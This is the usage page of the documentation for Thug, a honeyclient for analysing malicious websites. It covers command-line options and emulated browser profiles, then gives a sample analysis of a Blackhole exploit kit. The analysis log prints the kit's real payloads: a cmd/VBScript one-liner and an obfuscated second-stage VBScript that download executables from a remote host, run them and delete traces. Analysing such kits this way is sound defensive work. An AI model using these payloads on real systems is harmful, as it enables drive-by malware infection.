<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    
    <title>Usage &mdash; Thug 0.8.10 documentation</title>
    
    <link rel="stylesheet" href="static/classic.css" type="text/css" />
    <link rel="stylesheet" href="static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.8.10',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true
      };
    </script>
    <script type="text/javascript" src="static/jquery.js"></script>
    <script type="text/javascript" src="static/underscore.js"></script>
    <script type="text/javascript" src="static/doctools.js"></script>
    <link rel="top" title="Thug 0.8.10 documentation" href="index.html" />
    <link rel="next" title="Thug API" href="api.html" />
    <link rel="prev" title="Configuration" href="configuration.html" /> 
  </head>
  <body role="document">
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="genindex.html" title="General Index"
             accesskey="I">index</a></li>
        <li class="right" >
          <a href="api.html" title="Thug API"
             accesskey="N">next</a> |</li>
        <li class="right" >
          <a href="configuration.html" title="Configuration"
             accesskey="P">previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">Thug 0.8.10 documentation</a> &raquo;</li> 
      </ul>
    </div>  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="usage">
<span id="id1"></span><h1>Usage<a class="headerlink" href="#usage" title="Permalink to this headline">¶</a></h1>
<div class="toctree-wrapper compound">
<ul class="simple">
</ul>
</div>
<div class="section" id="basic-usage">
<h2>Basic usage<a class="headerlink" href="#basic-usage" title="Permalink to this headline">¶</a></h2>
<p>Let&#8217;s start our Thug tour by taking a look at the options it provides.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -h

Synopsis:
    Thug: Pure Python honeyclient implementation

Usage:
    thug <span class="o">[</span> options <span class="o">]</span> url

Options:
    -h, --help                      Display this <span class="nb">help</span> information
    -V, --version                   Display Thug version
    -u, --useragent<span class="o">=</span>                Select a user agent <span class="o">(</span>see below <span class="k">for</span> values, default: winxpie60<span class="o">)</span>
    -e, --events<span class="o">=</span>                   Enable comma-separated specified DOM events handling
    -w, --delay<span class="o">=</span>                    Set a maximum setTimeout/setInterval delay value <span class="o">(</span>in milliseconds<span class="o">)</span>
    -n, --logdir<span class="o">=</span>                   Set the log output directory
    -o, --output<span class="o">=</span>                   Log to a specified file
    -r, --referer                   Specify a referer
    -p, --proxy<span class="o">=</span>                    Specify a proxy <span class="o">(</span>see below <span class="k">for</span> format and supported schemes<span class="o">)</span>
    -l, --local                     Analyze a locally saved page
    -x, --local-nofetch             Analyze a locally saved page and prevent remote content fetching
    -v, --verbose                   Enable verbose mode
    -d, --debug                     Enable debug mode
    -q, --quiet                     Disable console logging
    -m, --no-cache                  Disable <span class="nb">local</span> web cache
    -a, --ast-debug                 Enable AST debug mode <span class="o">(</span>requires debug mode<span class="o">)</span>
    -g, --http-debug                Enable HTTP debug mode
    -t, --threshold                 Maximum pages to fetch
    -E, --extensive                 Extensive fetch of linked pages
    -T, --timeout<span class="o">=</span>                  Set the analysis timeout <span class="o">(</span>in seconds, default: <span class="m">600</span> seconds<span class="o">)</span>
    -B, --broken-url                Set the broken URL mode
    -y, --vtquery                   Query VirusTotal <span class="k">for</span> samples analysis
    -s, --vtsubmit                  Submit samples to VirusTotal
    -b, --vt-apikey<span class="o">=</span>                VirusTotal API key to be used at runtime
    -z, --web-tracking              Enable web client tracking inspection
    -N, --no-honeyagent             Disable HoneyAgent support

    Plugins:
    -A, --adobepdf<span class="o">=</span>                 Specify the Adobe Acrobat Reader version <span class="o">(</span>default: 9.1.0<span class="o">)</span>
    -P, --no-adobepdf               Disable Adobe Acrobat Reader plugin
    -S, --shockwave<span class="o">=</span>                Specify the Shockwave Flash version <span class="o">(</span>default: 10.0.64.0<span class="o">)</span>
    -R, --no-shockwave              Disable Shockwave Flash plugin
    -J, --javaplugin<span class="o">=</span>               Specify the JavaPlugin version <span class="o">(</span>default: 1.6.0.32<span class="o">)</span>
    -K, --no-javaplugin             Disable Java plugin

    Classifiers:
    -Q, --urlclassifier             Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> URL classifier rule files
    -W, --jsclassifier              Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> JS classifier rule files
    -C, --sampleclassifier          Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> sample classifier rule files

    Logging:
    -F, --file-logging              Enable file logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -Z, --json-logging              Enable JSON logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -M, --maec11-logging            Enable MAEC11 logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -G, --elasticsearch-logging     Enable ElasticSearch logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -D, --mongodb-address<span class="o">=</span>          Specify address and port of the MongoDB instance <span class="o">(</span>format: host:port<span class="o">)</span>
    -Y, --no-code-logging           Disable code logging
    -U, --no-cert-logging           Disable SSL/TLS certificate logging

Proxy Format:
    scheme://<span class="o">[</span>username:password@<span class="o">]</span>host:port <span class="o">(</span>supported schemes: http, socks4, socks5<span class="o">)</span>

Available User-Agents:
    winxpie60                       Internet Explorer 6.0   <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpie61                       Internet Explorer 6.1   <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpie70                       Internet Explorer 7.0   <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpie80                       Internet Explorer 8.0   <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpchrome20                   Chrome 20.0.1132.47     <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpfirefox12                  Firefox 12.0            <span class="o">(</span>Windows XP<span class="o">)</span>
    winxpsafari5                    Safari 5.1.7            <span class="o">(</span>Windows XP<span class="o">)</span>
    win2kie60                       Internet Explorer 6.0   <span class="o">(</span>Windows 2000<span class="o">)</span>
    win2kie80                       Internet Explorer 8.0   <span class="o">(</span>Windows 2000<span class="o">)</span>
    win7ie80                        Internet Explorer 8.0   <span class="o">(</span>Windows 7<span class="o">)</span>
    win7ie90                        Internet Explorer 9.0   <span class="o">(</span>Windows 7<span class="o">)</span>
    win7chrome20                    Chrome 20.0.1132.47     <span class="o">(</span>Windows 7<span class="o">)</span>
    win7chrome40                    Chrome 40.0.2214.91     <span class="o">(</span>Windows 7<span class="o">)</span>
    win7chrome45                    Chrome 45.0.2454.85     <span class="o">(</span>Windows 7<span class="o">)</span>
    win7chrome49                    Chrome 49.0.2623.87     <span class="o">(</span>Windows 7<span class="o">)</span>
    win7firefox3                    Firefox 3.6.13          <span class="o">(</span>Windows 7<span class="o">)</span>
    win7safari5                     Safari 5.1.7            <span class="o">(</span>Windows 7<span class="o">)</span>
    win10edge20                     Microsoft Edge 20.10240 <span class="o">(</span>Windows 10<span class="o">)</span>
    win10ie110                      Internet Explorer 11.0  <span class="o">(</span>Windows 10<span class="o">)</span>
    osx10chrome19                   Chrome 19.0.1084.54     <span class="o">(</span>MacOS X 10.7.4<span class="o">)</span>
    osx10safari5                    Safari 5.1.1            <span class="o">(</span>MacOS X 10.7.2<span class="o">)</span>
    linuxchrome26                   Chrome 26.0.1410.19     <span class="o">(</span>Linux<span class="o">)</span>
    linuxchrome30                   Chrome 30.0.1599.15     <span class="o">(</span>Linux<span class="o">)</span>
    linuxchrome44                   Chrome 44.0.2403.89     <span class="o">(</span>Linux<span class="o">)</span>
    linuxfirefox19                  Firefox 19.0            <span class="o">(</span>Linux<span class="o">)</span>
    linuxfirefox40                  Firefox 40.0            <span class="o">(</span>Linux<span class="o">)</span>
    galaxy2chrome18                 Chrome 18.0.1025.166    <span class="o">(</span>Samsung Galaxy S II, Android 4.0.3<span class="o">)</span>
    galaxy2chrome25                 Chrome 25.0.1364.123    <span class="o">(</span>Samsung Galaxy S II, Android 4.0.3<span class="o">)</span>
    galaxy2chrome29                 Chrome 29.0.1547.59     <span class="o">(</span>Samsung Galaxy S II, Android 4.1.2<span class="o">)</span>
    nexuschrome18                   Chrome 18.0.1025.133    <span class="o">(</span>Google Nexus, Android 4.0.4<span class="o">)</span>
    ipadchrome33                    Chrome 33.0.1750.21     <span class="o">(</span>iPad, iOS 7.1<span class="o">)</span>
    ipadchrome35                    Chrome 35.0.1916.41     <span class="o">(</span>iPad, iOS 7.1.1<span class="o">)</span>
    ipadchrome37                    Chrome 37.0.2062.52     <span class="o">(</span>iPad, iOS 7.1.2<span class="o">)</span>
    ipadchrome38                    Chrome 38.0.2125.59     <span class="o">(</span>iPad, iOS 8.0.2<span class="o">)</span>
    ipadchrome39                    Chrome 39.0.2171.45     <span class="o">(</span>iPad, iOS 8.1.1<span class="o">)</span>
    ipadchrome45                    Chrome 45.0.2454.68     <span class="o">(</span>iPad, iOS 8.4.1<span class="o">)</span>
    ipadchrome46                    Chrome 46.0.2490.73     <span class="o">(</span>iPad, iOS 9.0.2<span class="o">)</span>
    ipadchrome47                    Chrome 47.0.2526.70     <span class="o">(</span>iPad, iOS 9.1<span class="o">)</span>
    ipadsafari7                     Safari 7.0              <span class="o">(</span>iPad, iOS 7.0.4<span class="o">)</span>
    ipadsafari8                     Safari 8.0              <span class="o">(</span>iPad, iOS 8.0.2<span class="o">)</span>
    ipadsafari9                     Safari 9.0              <span class="o">(</span>iPad, iOS 9.1<span class="o">)</span>
</pre></div>
</div>
<p>Let&#8217;s start with a first basic real-world example: a Blackhole exploit kit.</p>
<div class="highlight-sh"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70</pre></div></td><td class="code"><div class="highlight"><pre><span></span>       ~ $ thug <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
       <span class="o">[</span>2012-07-02 19:15:20<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:20<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
       <span class="o">[</span>2012-07-02 19:15:20<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
       <span class="o">[</span>2012-07-02 19:15:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:23<span class="o">]</span> Saving applet Ryp.jar
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: acropdf.pdf
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: adodb.stream
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: shell.application
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
       <span class="o">[</span>2012-07-02 19:15:24<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span>2
       <span class="o">[</span>2012-07-02 19:15:27<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//a2ffcd1.exe<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//a2ffcd1.exe
       <span class="o">[</span>2012-07-02 19:15:29<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; 64
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Code:
       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
       <span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0
       <span class="o">[</span>2012-07-02 19:15:37<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span>2012-07-02 19:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
       <span class="o">[</span>2012-07-02 19:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 2<span class="o">]</span> Code:
       <span class="nv">w</span><span class="o">=</span>3000:x<span class="o">=</span>200:y<span class="o">=</span>1:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
       Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
       On Error resume next
       c.open OT, a, z:c.send<span class="o">()</span>
       If c.Status <span class="o">=</span> x Then
       d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
       End If
       Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
       Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
       W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span>3-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span>56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">       [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</span>
</pre></div>
</td></tr></table></div>
<p>Let&#8217;s take a look at the directory which contains the logs for this session</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ <span class="nb">cd</span> /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
/tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 $ ls -lhR
.:
total 232K
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">1008</span> Jul  <span class="m">2</span> 19:15 502da89357ca5d7c85dc7a67f8977b21
-rw-r--r-- <span class="m">1</span> buffer buffer  81K Jul  <span class="m">2</span> 19:15 analysis.xml
drwxr-xr-x <span class="m">6</span> buffer buffer  <span class="m">176</span> Jul  <span class="m">2</span> 19:15 application
-rwxr-xr-x <span class="m">1</span> buffer buffer  89K Jul  <span class="m">2</span> 19:15 d328b5a123bce1c0d20d763ad745303a
-rw-r--r-- <span class="m">1</span> buffer buffer  51K Jul  <span class="m">2</span> 19:15 Ryp.jar
drwxr-xr-x <span class="m">3</span> buffer buffer   <span class="m">72</span> Jul  <span class="m">2</span> 19:15 text

./application:
total 0
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> 19:15 java-archive
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> 19:15 pdf
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> 19:15 x-msdownload
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> 19:15 x-shockwave-flash

./application/java-archive:
total 52K
-rw-r--r-- <span class="m">1</span> buffer buffer 51K Jul  <span class="m">2</span> 19:15 e3639fde6ddf7fd0182fff9757143ff2

./application/pdf:
total 16K
-rw-r--r-- <span class="m">1</span> buffer buffer 15K Jul  <span class="m">2</span> 19:15 3660fe0e4acd23ac13f3d043eebd2bbc

./application/x-msdownload:
total 92K
-rw-r--r-- <span class="m">1</span> buffer buffer 89K Jul  <span class="m">2</span> 19:15 d328b5a123bce1c0d20d763ad745303a

./application/x-shockwave-flash:
total 4.0K
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">1008</span> Jul  <span class="m">2</span> 19:15 502da89357ca5d7c85dc7a67f8977b21

./text:
total 0
